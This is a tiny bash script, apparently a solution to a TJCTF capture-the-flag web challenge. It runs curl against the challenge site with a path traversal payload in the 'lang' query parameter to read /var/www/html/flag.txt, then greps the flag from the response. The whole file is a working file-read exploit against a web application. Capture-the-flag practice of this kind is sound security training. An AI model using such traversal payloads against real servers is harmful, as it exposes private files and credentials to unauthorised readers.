#!/bin/bash

curl "https://programmable_hyperlinked_pasta.tjctf.org/?lang=../../../../../../../var/www/html/flag.txt" -s |grep -oE "tjctf{.*}" --color=none
